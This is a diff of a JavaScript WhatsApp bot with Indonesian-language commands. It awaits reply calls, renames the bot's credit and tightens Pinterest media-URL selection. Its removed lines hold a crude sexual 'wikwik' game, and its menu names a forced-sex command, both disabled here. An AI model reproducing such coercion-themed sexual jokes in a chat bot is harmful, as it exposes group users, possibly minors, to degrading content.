+                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "🛍️ Website Store", id: `${prefix}store` }) },
                 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: " ⌞愛⌝ Rpg Menu ⛈️", id: `${prefix}rpgmenu` }) },
                 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "⌞愛⌝ Primbon Menu ⛈️", id: `${prefix}primbonmenu` }) },
                 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "⌞愛⌝ Editing Menu ⛈️", id: `${prefix}editingmenu` }) },
@@ -15924,7 +16091,7 @@ if (!m.quoted) return replyV1("❌ Reply video nya bang")
 let mime = (m.quoted.msg || m.quoted).mimetype || ""
 if (!/video/.test(mime)) return replyV1("❌ Harus video (mp4)")
 
-replyV1("⏳ Uploading video...")
+await replyV1("⏳ Uploading video...")
 
 let media = await conn.downloadAndSaveMediaMessage(m.quoted)
 
@@ -15943,11 +16110,11 @@ headers: form.getHeaders()
 
 fs.unlinkSync(media)
 
-replyV1(`✅ *Upload Berhasil!*\n\n🔗 ${res.data}`)
+await replyV1(`✅ *Upload Berhasil!*\n\n🔗 ${res.data}`)
 
 } catch (e) {
 console.log(e)
-replyV1("❌ Error upload bang")
+await replyV1("❌ Error upload bang")
 }
 }
 break
@@ -15961,7 +16128,7 @@ case "mp4toaudio": {
             return replyV1("Kirim / reply video dulu!")
         }
 
-        replyV1("⏳ Mengubah video ke audio...")
+        await replyV1("⏳ Mengubah video ke audio...")
 
         // download video
         let media = await q.download()
@@ -15994,7 +16161,7 @@ case "mp4toaudio": {
 
     } catch (e) {
         console.log(e)
-        replyV1("❌ Terjadi error!")
+        await replyV1("❌ Terjadi error!")
     }
 }
 break;
@@ -16040,7 +16207,7 @@ case 'audiotourl': {
         await conn.sendMessage(m.chat, { text: caption }, { quoted: m });
     } catch (e) {
         console.error(e);
-        replyV1(`[ ! ] Gagal mengunggah audio. Error: ${e.message}`);
+        await replyV1(`[ ! ] Gagal mengunggah audio. Error: ${e.message}`);
     }
 };
 break;
@@ -16057,7 +16224,7 @@ const axios = require("axios")
 
 let res = await axios.get(`https://api.mymemory.translated.net/get?q=${encodeURIComponent(query)}&langpair=auto|${lang}`)
 
-replyV1(`Translate (${lang}) :\n${res.data.responseData.translatedText}`)
+await replyV1(`Translate (${lang}) :\n${res.data.responseData.translatedText}`)
 
 }
 break
@@ -16126,7 +16293,7 @@ case 'download':
 case "aio": {
      if (!text) return replyV1(`\`masukan link/url nya\``)
 
-     // Perilaku command .spotify dari Furina: query mencari track; link track
+     // Perilaku command .spotify dari Xeryuu: query mencari track; link track
      // langsung masuk ke downloader Spotify. Alias downloader universal lain
      // tetap menggunakan alur semula dan tidak terpengaruh.
      if (String(command || '').toLowerCase() === 'spotify') {
@@ -16304,7 +16471,7 @@ case "aio": {
     await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
   } catch (err) {
     await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }) 
-    replyV1(err.message)
+    await replyV1(err.message)
   }
 break;
 }
@@ -16359,66 +16526,39 @@ case "pinterest": {
             JSON.stringify(data, null, 2)
         )
 
-        // Mencari URL media dari response API
-        function findMediaUrl(obj) {
-            if (!obj) return null
-
-            // Kalau langsung berupa URL
-            if (typeof obj === 'string') {
-                if (/^https?:\/\//i.test(obj)) {
-                    return obj
-                }
-                return null
+        // Ambil URL media saja; jangan salah memilih URL halaman pin sebagai file gambar/video.
+        function findMediaUrls(value, out = [], depth = 0) {
+            if (value == null || depth > 8 || out.length >= 20) return out
+            if (typeof value === 'string') {
+                if (!/^https:\/\//i.test(value)) return out
+                try {
+                    const parsed = new URL(value)
+                    const host = parsed.hostname.toLowerCase()
+                    const isPinterestCdn = /(?:^|\.)pinimg\.com$/.test(host)
+                    const hasMediaExtension = /\.(?:jpe?g|png|webp|gif|avif|mp4|m4v|mov|webm|mkv)(?:[?#]|$)/i.test(value)
+                    if (isPinterestCdn || hasMediaExtension) out.push(value)
+                } catch {}
+                return out
             }
-
-            // Kalau array
-            if (Array.isArray(obj)) {
-                for (const item of obj) {
-                    const found = findMediaUrl(item)
-                    if (found) return found
-                }
-                return null
+            if (Array.isArray(value)) {
+                for (const entry of value) findMediaUrls(entry, out, depth + 1)
+                return out
             }
-
-            // Kalau object
-            if (typeof obj === 'object') {
-
-                // Prioritaskan field yang biasanya berisi media
-                const priorityKeys = [
-                    'url',
-                    'download',
-                    'downloadUrl',
-                    'media',
-                    'mediaUrl',
-                    'video',
-                    'videoUrl',
-                    'image',
-                    'imageUrl',
-                    'src',
-                    'hd',
-                    'hdUrl',
-                    'original',
-                    'originalUrl'
-                ]
-
+            if (typeof value === 'object') {
+                const priorityKeys = ['downloadUrl', 'download_url', 'mediaUrl', 'media_url', 'download', 'video', 'image', 'url', 'src', 'original', 'originalUrl', 'hd']
                 for (const key of priorityKeys) {
-                    if (obj[key]) {
-                        const found = findMediaUrl(obj[key])
-                        if (found) return found
-                    }
+                    if (value[key] != null) findMediaUrls(value[key], out, depth + 1)
                 }
-
-                // Cari seluruh object jika field di atas tidak ditemukan
-                for (const key of Object.keys(obj)) {
-                    const found = findMediaUrl(obj[key])
-                    if (found) return found
+                for (const [key, entry] of Object.entries(value)) {
+                    if (!priorityKeys.includes(key) && entry && typeof entry === 'object') findMediaUrls(entry, out, depth + 1)
                 }
             }
-
-            return null
+            return out
         }
 
-        const mediaUrl = findMediaUrl(data)
+        const mediaCandidates = [...new Set(findMediaUrls(data))]
+        // Prefer a direct video where available; otherwise select the first direct image.
+        const mediaUrl = mediaCandidates.find(url => /\.(?:mp4|m4v|mov|webm|mkv)(?:[?#]|$)/i.test(url)) || mediaCandidates[0] || null
 
         console.log(
             '[PINTEREST MEDIA URL]',
@@ -16532,11 +16672,11 @@ caption += `🔗 ${data[i].trackViewUrl}\n\n`
 
 }
 
-replyV1(caption)
+await replyV1(caption)
 
 } catch (err) {
 console.log("SPOTIFY SEARCH ERROR:", err.message)
-replyV1("Search lagu gagal")
+await replyV1("Search lagu gagal")
 }
 
 }
@@ -16829,9 +16969,9 @@ footer: `
 ║ ⪩ .ngojek
 ║ ⪩ .polisi
 ║ ⪩ .roket
-║ ⪩ .wikwik
-║ ⪩ .ewe-paksa
-║ ⪩ .open-bo
+║ ⪩ .wikwik (dinonaktifkan)
+║ ⪩ .ewe-paksa (dinonaktifkan)
+║ ⪩ .open-bo (dinonaktifkan)
 ║ ⪩ .selectskill
 ║ ⪩ .cekskill
 ║ ⪩ .makan
@@ -17862,7 +18002,7 @@ case 'jashermenu': {
         `│⦿ ⚡ *${prefix}addalya (PT JS)*\n` +
         `│⦿ 📢 *${prefix}jpmch*\n` +
         `◣──────────❈\n\n` +
-        `Catatan: ${prefix}addhyd dan ${prefix}addalya tercantum di menu Furina, tetapi handler fungsionalnya tidak ditemukan pada source yang dikirim; perintah itu belum menjalankan tindakan. Daftar tujuan menggunakan nama chat/anggota jika dapat diambil, bukan ID mentah.`
+        `Catatan: ${prefix}addhyd dan ${prefix}addalya tercantum di menu Xeryuu, tetapi handler fungsionalnya tidak ditemukan pada source yang dikirim; perintah itu belum menjalankan tindakan. Daftar tujuan menggunakan nama chat/anggota jika dapat diambil, bukan ID mentah.`
     );
 }
 break
@@ -18620,63 +18760,7 @@ case 'joinrpg': {
     break
 
     case 'wikwik': {
-
-      if (!global.db.erpg[m.sender].rpg) return replyV1(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
-      if (global.db.erpg[m.sender].stamina <= 15) return replyV1(`Kamu tidak bisa ewe anak orang, stamina kamu ${global.db.erpg[m.sender].stamina}%\n\nPulihkan stamina menggunakan potion,\nContoh : .heal`)
-      if (!q) return replyV1(`Contoh: ${command} conn`)
-      const argsLower = args.map(arg => arg.toLowerCase());
-      const petarung1 = argsLower[0];
-      const petarung2 = argsLower[1];
-      const totalRounds = 8;
-      let ronde = 1;
-      let nyawaPetarung1 = 200;
-      let nyawaPetarung2 = 200;
-
-      let result = `🫶 Wikwik antara ${db.users[m.sender].nama} dan ${args[0]} dimulai!\n\n`;
-
-      while (ronde <= totalRounds && nyawaPetarung1 > 0 && nyawaPetarung2 > 0) {
-        const pukulan = [
-          'ajul gedang', 'gaya marmot', 'gaya roket', 'gaya kucing', 'gaya katak'
-        ];
-
-        const pilihanPetarung1 = pukulan[Math.floor(Math.random() * pukulan.length)];
-        const pilihanPetarung2 = pukulan[Math.floor(Math.random() * pukulan.length)];
-
-        const damagePetarung1 = Math.floor(Math.random() * 50) + 1;
-        const damagePetarung2 = Math.floor(Math.random() * 50) + 1;
-
-        result += `💦 Ronde ${ronde}\n`;
-        result += `${db.users[m.sender].nama} stamina: ${nyawaPetarung1}\n`;
-        result += `${args[0]} stamina: ${nyawaPetarung2}\n`;
-        result += `${db.users[m.sender].nama}: ${pilihanPetarung1}\n`;
-        result += `${args[0]}: ${pilihanPetarung2}\n\n`;
-
-        if (pilihanPetarung1 === pilihanPetarung2) {
-          result += `⚔️ Wikwik sedang berlangsung melakukan gaya yang sama! blom ada yang keluar sama sekali.\n`;
-        } else {
-          result += `💦 ${db.users[m.sender].nama} melakukan ${pilihanPetarung1} dan ${args[0]} melakukan ${pilihanPetarung2}!\n`;
-          nyawaPetarung1 -= pilihanPetarung2 === 'jab' ? damagePetarung1 : damagePetarung1 + 10;
-          nyawaPetarung2 -= pilihanPetarung1 === 'jab' ? damagePetarung2 : damagePetarung2 + 10;
-          result += `💔 ${db.users[m.sender].nama} menerima jilmek ${nyawaPetarung1 >= 0 ? damagePetarung1 : 0}!\n`;
-          result += `💔 ${args[0]} menerima spong ${nyawaPetarung2 >= 0 ? damagePetarung2 : 0}!\n\n--------------------------------------------------\n`;
-        }
-
-        ronde++;
-      }
-
-      result += `\n⏱️ Wikwik akhirnya berakhir!\n`;
-      result += `${db.users[m.sender].nama} stamina akhir: ${nyawaPetarung1}\n`;
-      result += `${args[0]} stamina akhir: ${nyawaPetarung2}\n`;
-
-      if (nyawaPetarung1 > nyawaPetarung2) {
-        result += `👙 ${db.users[m.sender].nama} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`;
-      } else if (nyawaPetarung2 > nyawaPetarung1) {
-        result += `🩲 ${args[0]} memenangkan pertandingan dengan keluar cairan yang lebih banyak!\n`;
-      } else {
-        result += `👙💦 Pertandingan berakhir imbang! Kedua yang wikwik memiliki stamina yang sama.\n`;
-      }
-      global.db.erpg[m.sender].stamina -= 50
-await replyV1(result)
+      return replyV1('🛡️ Command wikwik dinonaktifkan. Gunakan .duel untuk pertarungan RPG yang aman.')
     }
     break
 
@@ -18806,7 +18890,7 @@ Stamina terpakai: ${stamina}`
       if (new Date() - global.db.erpg[m.sender].lastmakan < 14400000) return replyV1(`Kamu Baru Saja Makan, ${waktuu} Yang Lalu, Kamu dapat Makan Lagi Setelah 4 Jam Berikutnya.`)
 
       let drhstam = await randomNomor(65, 95)
-      replyV1(`Kamu makan sampai kenyang
+      await replyV1(`Kamu makan sampai kenyang
 Darah dan stamina kamu bertambah
 sebanyak ${drhstam}%`)
       global.db.erpg[m.sender].darahuser += drhstam
@@ -18826,7 +18910,7 @@ sebanyak ${drhstam}%`)
 
       let drhstam = await randomNomor(70, 100)
       let tidur = await randomNomor(3, 14)
-      replyV1(`Kamu tidur selama ${tidur} jam
+      await replyV1(`Kamu tidur selama ${tidur} jam
 Darah dan stamina kamu bertambah
 sebanyak ${drhstam}%`)
       global.db.erpg[m.sender].darahuser += drhstam
@@ -19039,7 +19123,7 @@ break
       global.db.erpg[m.sender].darahuser -= health
       global.db.erpg[m.sender].sampahtime = new Date * 1
 
-      replyV1(`*–––––– NYAMPAH ––––––*
+      await replyV1(`*–––––– NYAMPAH ––––––*
 
 Items Didapat
   ${vircion} • Botol: ${botol}
@@ -19072,9 +19156,9 @@ Kamu hanya bisa memilih skill 1x selebihnya
 tidak akan bisa memilih/ganti lagi`)
       if (!user || !user.skill) {
         global.db.erpg[m.sender].skillselect = skil
-        replyV1(`Anda telah memilih Skill ${skil}`)
+        await replyV1(`Anda telah memilih Skill ${skil}`)
       } else {
-        replyV1(`Anda Sudah Punya skill ${user.skill}. Tidak bisa diganti`)
+        await replyV1(`Anda Sudah Punya skill ${user.skill}. Tidak bisa diganti`)
       }
     }
     break
@@ -19091,7 +19175,7 @@ tidak akan bisa memilih/ganti lagi`)
         if (global.db.erpg[m.sender].bulu < bulu) return replyV1(`*Bulu Wol Kamu (${global.db.erpg[m.sender].bulu}) Tidak Cukup Untuk Membuat ${args[1]} Lembar Kain*\n\nUntuk Membuat 1 Lembar Kain Diperlukan *2 Bulu Wolf*.\n\nSilahkan Berburu Terlebih Dahulu!`)
         global.db.erpg[m.sender].kain += parseInt(args[1])
         global.db.erpg[m.sender].bulu -= bulu
-        replyV1(`Berhasil Membuat ${args[1]} Lembar Kain, Kamu Mempunyai ${global.db.erpg[m.sender].bulu} Bulu Lagi`)
+        await replyV1(`Berhasil Membuat ${args[1]} Lembar Kain, Kamu Mempunyai ${global.db.erpg[m.sender].bulu} Bulu Lagi`)
       } else if (args[0] === "kapal") {
         if (global.db.erpg[m.sender].kapal) return replyV1('Kamu Sudah Memiliki Kapal!')
         let besi = Number(20)
@@ -19349,7 +19433,7 @@ tidak akan bisa memilih/ganti lagi`)
       global.db.erpg[m.sender].potion -= 1
       global.db.erpg[m.sender].darahuser += health
       global.db.erpg[m.sender].stamina += stamina
-      replyV1(`Berhasil Memulihkan Dengan Potion
+      await replyV1(`Berhasil Memulihkan Dengan Potion
 Health: +${health}
 Stamina: +${stamina}`)
     }
@@ -19501,7 +19585,7 @@ ${command} kapak`
       let kayu = await randomNomor(0, 20)
       global.db.erpg[m.sender].kayu += kayu
       global.db.erpg[m.sender].darahkapak -= 20
-      replyV1(`*🌳 MENEBANG POHON 🌳*
+      await replyV1(`*🌳 MENEBANG POHON 🌳*
 
 Item Yang Didapat:
   ${vircion} • Kayu: ${kayu} (Hasil Tebang)
@@ -19520,10 +19604,10 @@ Item Yang Didapat:
         global.db.erpg[m.sender].weeklyclaim = new Date * 1
         db.users[m.sender].saldo += saldo
         db.users[m.sender].limit += limit
-        replyV1(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
+        await replyV1(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
       } catch (err) {
         console.error(err);
-        replyV1('Terjadi kesalahan: ' + err);
+        await replyV1('Terjadi kesalahan: ' + err);
       }
     }
     break
@@ -19540,10 +19624,10 @@ Item Yang Didapat:
         global.db.erpg[m.sender].monthlyclaim = new Date * 1
         db.users[m.sender].saldo += saldo
         db.users[m.sender].limit += limit
-        replyV1(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
+        await replyV1(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
       } catch (err) {
         console.error(err);
-        replyV1('Terjadi kesalahan: ' + err);
+        await replyV1('Terjadi kesalahan: ' + err);
       }
     }
     break
@@ -19560,10 +19644,10 @@ Item Yang Didapat:
         global.db.erpg[m.sender].yearlyclaim = new Date * 1
         db.users[m.sender].saldo += saldo
         db.users[m.sender].limit += limit
-        replyV1(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
+        await replyV1(`Selamat Kamu Mendapatkan:\n\n*🎁 HADIAH*\n- + Rp ${saldo} \n- + ${limit} Limit\n\n`)
       } catch (err) {
         console.error(err);
-        replyV1('Terjadi kesalahan: ' + err);
+        await replyV1('Terjadi kesalahan: ' + err);
       }
     }
     break
@@ -19606,7 +19690,7 @@ Item Yang Didapat:
       global.db.erpg[m.sender].gajah += gajah
       global.db.erpg[m.sender].babihutan += buaya
       global.db.erpg[m.sender].darahuser -= darah
-      replyV1(`*🏹 BERBURU 🏹*
+      await replyV1(`*🏹 BERBURU 🏹*
 
 Item Yang Didapat:
   ${vircion} • Domba: ${domba}
@@ -20411,7 +20495,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].emas}` < `${jumlh}`) return replyV1(`*Emas Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].emas -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Emas: ${args[1]}
@@ -20432,7 +20516,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].besi}` < `${jumlh}`) return replyV1(`*Besi Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].besi -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Besi: ${args[1]}
@@ -20453,7 +20537,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].batubara}` < `${jumlh}`) return replyV1(`*Batu Bara Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].batubara -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Batu Bara: ${args[1]}
@@ -20474,7 +20558,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].perak}` < `${jumlh}`) return replyV1(`*Perak Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].perak -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Perak: ${args[1]}
@@ -20495,7 +20579,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].kayu}` < `${jumlh}`) return replyV1(`*Kayu Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kayu -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kayu: ${args[1]}
@@ -20516,7 +20600,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].ayam}` < `${jumlh}`) return replyV1(`*Ayam Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].ayam -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Ayam: ${args[1]}
@@ -20537,7 +20621,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].sapi}` < `${jumlh}`) return replyV1(`*Sapi Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].sapi -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Sapi: ${args[1]}
@@ -20558,7 +20642,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].domba}` < `${jumlh}`) return replyV1(`*Domba Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].domba -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Domba: ${args[1]}
@@ -20579,7 +20663,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].ikan}` < `${jumlh}`) return replyV1(`*Ikan Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].ikan -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Ikan: ${args[1]}
@@ -20600,7 +20684,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].rumah}` < `${jumlh}`) return replyV1(`*Rumah Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].rumah -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • rumah: ${args[1]}
@@ -20621,7 +20705,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].emerald}` < `${jumlh}`) return replyV1(`*Emerald Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].emerald -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Emerald: ${args[1]}
@@ -20642,7 +20726,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].diamond}` < `${jumlh}`) return replyV1(`*Diamond Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].diamond -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Diamond: ${args[1]}
@@ -20663,7 +20747,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].botol}` < `${jumlh}`) return replyV1(`*Botol Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].botol -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Botol: ${args[1]}
@@ -20684,7 +20768,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].kardus}` < `${jumlh}`) return replyV1(`*Kardus Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kardus -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kardus: ${args[1]}
@@ -20705,7 +20789,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].kaleng}` < `${jumlh}`) return replyV1(`*Kaleng Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kaleng -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kaleng: ${args[1]}
@@ -20726,7 +20810,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].gelas}` < `${jumlh}`) return replyV1(`*Gelas Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].gelas -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Gelas: ${args[1]}
@@ -20747,7 +20831,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].plastik}` < `${jumlh}`) return replyV1(`*Plastik Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].plastik -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Plastik: ${args[1]}
@@ -20768,7 +20852,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].banteng}` < `${jumlh}`) return replyV1(`*Banteng Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].banteng -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Banteng: ${args[1]}
@@ -20789,7 +20873,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].gajah}` < `${jumlh}`) return replyV1(`*Gajah Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].gajah -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Gajah: ${args[1]}
@@ -20810,7 +20894,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].harimau}` < `${jumlh}`) return replyV1(`*Harimau Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].harimau -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Harimau: ${args[1]}
@@ -20831,7 +20915,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].kambing}` < `${jumlh}`) return replyV1(`*Kambing Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kambing -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kambing: ${args[1]}
@@ -20852,7 +20936,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].panda}` < `${jumlh}`) return replyV1(`*Panda Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].panda -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Panda: ${args[1]}
@@ -20873,7 +20957,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].buaya}` < `${jumlh}`) return replyV1(`*Buaya Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].buaya -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Buaya: ${args[1]}
@@ -20894,7 +20978,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].kerbau}` < `${jumlh}`) return replyV1(`*Kerbau Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].kerbau -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Kerbau: ${args[1]}
@@ -20915,7 +20999,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].monyet}` < `${jumlh}`) return replyV1(`*Monyet Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].monyet -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Monyet: ${args[1]}
@@ -20936,7 +21020,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].babihutan}` < `${jumlh}`) return replyV1(`*Babi Hutan Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].babihutan -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
   ${vircion} • Babi Hutan: ${args[1]}
@@ -20957,7 +21041,7 @@ if (!args[1]) return replyV1(`*Masukan Jumlahnya*\n\nContoh:\n${command} ${args[
         if (`${global.db.erpg[m.sender].babi}` < `${jumlh}`) return replyV1(`*Babi Kamu Tidak Cukup*`)
         db.users[m.sender].saldo += uang
         global.db.erpg[m.sender].babi -= parseInt(args[1])
-        replyV1(`*MARKET - JUAL🛍️*
+        await replyV1(`*MARKET - JUAL🛍️*
 
 *Item Terjual:*
